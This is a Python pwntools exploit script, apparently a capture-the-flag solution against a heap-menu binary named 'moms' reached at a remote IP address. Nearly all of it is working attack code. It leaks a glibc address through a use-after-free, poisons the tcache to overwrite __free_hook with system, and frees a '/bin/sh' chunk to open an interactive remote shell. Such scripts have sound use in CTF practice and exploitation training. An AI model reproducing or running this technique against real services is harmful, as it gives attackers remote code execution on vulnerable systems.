from pwn import *
import re

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''

#context.terminal = ['tmux', 'splitw', '-h']
#p=process("./moms")
p = remote("207.154.239.148", 2001)
#p=gdb.debug("./moms", gdbscript=gs)
#gdb.attach(p)

def malloc(ind, size, payload):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3


# Now actual exploit script:
malloc(0, 24, b"first A")
malloc(1, 24, b"second B")
malloc(2, 0x421, b"bigone C")
malloc(3, 24, b"/bin/sh")
free(2)
resp = view(2)      # Get glibc leak
leak = resp.split(b"index?\n> ")[1].split(b"\nYou ")[0]
leak = u64(leak.ljust(8, b"\x00"))
base = leak - 2018272       # Calculate glibc base w/ offset

elf = ELF("./libc.so.6")
freehookOffset = elf.sym["__free_hook"]
systemOffset = elf.sym["system"]
freehook = base + freehookOffset
system = base + systemOffset

free(0)
free(1)
edit(1, p64(freehook))
malloc(4, 24, b"another E")
malloc(5, 24, p64(system))      # Replace __free_hook() with system()
free(3)     # Call system("/bin/sh")
p.interactive()
